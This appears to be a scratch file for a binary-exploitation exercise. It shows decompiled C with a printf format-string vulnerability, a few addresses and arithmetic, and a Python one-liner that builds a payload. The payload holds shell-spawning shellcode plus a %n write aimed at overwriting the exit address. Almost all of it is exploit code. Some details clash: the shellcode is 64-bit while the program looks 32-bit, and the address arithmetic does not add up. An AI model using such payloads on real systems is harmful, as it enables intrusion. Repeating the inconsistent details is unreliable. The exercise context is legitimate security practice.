int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+28h] [ebp-70h] BYREF
  unsigned int i; // [esp+8Ch] [ebp-Ch]

  i = 0;
  fgets(s, 100, stdin);
  for ( i = 0; i < strlen(s); ++i )
  {
    if ( s[i] > 64 && s[i] <= 90 )
      s[i] ^= 0x20u;
  }
  printf(s);
  exit(0);
}

0x80497e0 (exit)

0xffffd6c8 (start buffer) => 4294956744 - 21

4294956712


python -c 'print("\x48\x31\xc0\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05" + "A" * 3 + "\x08\x04\x97\xe0"[::-1] + "%2147478356d%2147478356d%17$n")' > /tmp/payload5